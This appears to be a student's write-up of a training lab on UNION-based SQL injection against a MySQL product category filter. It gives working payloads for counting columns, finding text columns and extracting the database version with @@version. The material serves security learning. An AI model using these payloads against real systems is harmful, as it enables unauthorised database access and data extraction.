# **Lab 04 - SQL injection attack, querying the database type and version on MySQL and Microsoft**


## Scenario
***
**SQL injection vulnerability** -> product category filter

**End Goal**                              -> display the database version string
***

## Analysis

### **(1)  Find the number of columns**

There are two different methods that can be used:

* 1st method (internal server error)

```
' ORDER BY 3#
```

* 2nd method

```
' UNION SELECT NULL,NULL#
```

**Conclusion:** 2 columns

### **(2) Figure out which columns contain text**

```
' UNION SELECT 'a', 'a'#
```

**Conclusion:** Both columns contain text

### **(3) Output the version**

```
' UNION SELECT @@version, NULL#
```

**Conclusion:** The version displayed is "8.0.33-0ubuntu0.20.04.4"
